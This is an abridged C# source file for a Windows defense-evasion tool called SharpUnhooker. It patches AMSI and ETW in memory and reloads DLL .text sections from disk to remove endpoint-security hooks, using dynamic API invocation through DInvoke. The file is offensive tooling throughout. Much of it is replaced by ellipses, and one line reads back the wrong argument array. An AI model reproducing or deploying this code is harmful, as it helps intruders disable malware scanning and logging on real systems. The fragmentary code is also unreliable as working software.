...
namespace SharpUnhooker
{
    ...
    public class PatchAMSI_And_ETW
    {
        // Import required APIs
        uint readwrite = 0x40;
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        ...
        private static void PatchMem(byte[] patch, string library, string function)
        {
            ...
            try
            {
                ...
                object[] GetProcAddrArgs = { libPtr, function };
                IntPtr funcPtr = (IntPtr)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "GetProcAddress", typeof(GetProcAddress), ref GetProcAddrArgs, true, true);


                object[] VirtualProtectArgs = { funcPtr, (UIntPtr)patch.Length, readwrite, oldProtect };
                bool updateProtection = (bool)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref VirtualProtectArgs, true, true);
                oldProtect = (uint)VirtualProtectArgs[3];
        ...
        public static void PatchAMSIAndETW()
        {
            bool isit64bit;
            if (IntPtr.Size == 4)
            {
    ...
    public class SharpUnhooker
    {
        ...
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        ...
        public static void Unhooker(string DLLname)
        {
            ...
            {
                object[] VirtualAllocArgs = {IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
                codebase = (IntPtr)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualAlloc", typeof(VirtualAlloc), ref VirtualAllocArgs, true, true);
            }
            else
            {
                object[] VirtualAllocArgs = { IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
                codebase = (IntPtr)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualAlloc", typeof(VirtualAlloc), ref VirtualAllocArgs, true, true);
            }
            for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++)
            {
                if (OriginalDLL.ImageSectionHeaders[i].Section == ".text")
                {
                    ...
                    object[] VirtualAllocArgs = { IntPtr.Add(codebase, (int)OriginalDLL.ImageSectionHeaders[i].VirtualAddress), OriginalDLL.ImageSectionHeaders[i].SizeOfRawData, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
                    IntPtr byteLocationOnMemory = (IntPtr)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualAlloc", typeof(VirtualAlloc), ref VirtualAllocArgs, true, true);
                    ...
                    if (assemblyBytes != null && assemblyBytes.Length > 0)
                    {
                        ...
                        if (ModuleHandleInMemory != IntPtr.Zero)
                        {
                            ...
                            uint oldProtect = 0;
                            object[] VirtualProtectArgs = { InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, PAGE_EXECUTE_READWRITE, oldProtect };
                            bool updateProtection = (bool)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref VirtualProtectArgs, true, true);
                            oldProtect = (uint)VirtualProtectArgs[3];
                            ...
                            if (updateProtection)
                            {
                                ...
                                uint newProtect = 0;
                                object[] VirtualProtectArgs2 = { InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, newProtect };
                                DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref VirtualProtectArgs2, true, true);
                                newProtect = (uint)VirtualProtectArgs[3];
                ...
                if (OriginalDLL.ImageSectionHeaders[i].Section == ".text")
                {
                    ...
                    if (assemblyBytes != null && assemblyBytes.Length > 0)
                    {
                        ...
                        if (ModuleHandleInMemory != IntPtr.Zero)
                        {
                            ...
                            oldProtect = 0;
                            object[] VirtualProtectArgs = { InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, readwrite, oldProtect };
                            bool updateProtection = (bool)DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref VirtualProtectArgs, true, true);
                            oldProtect = (uint)VirtualProtectArgs[3];
                            ...
                            if (updateProtection)
                            {
                                ...
                                object[] VirtualProtectArgs2= { InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, newProtect };
                                DInvoke.DynamicGeneric.DynamicAPIInvoke("kernel32.dll", "VirtualProtect", typeof(VirtualProtect), ref VirtualProtectArgs2, true, true);
                                newProtect = (uint)VirtualProtectArgs2[3];
        ...
        public static void test()
        {
            ...
            PatchAMSI_And_ETW.PatchAMSIAndETW();
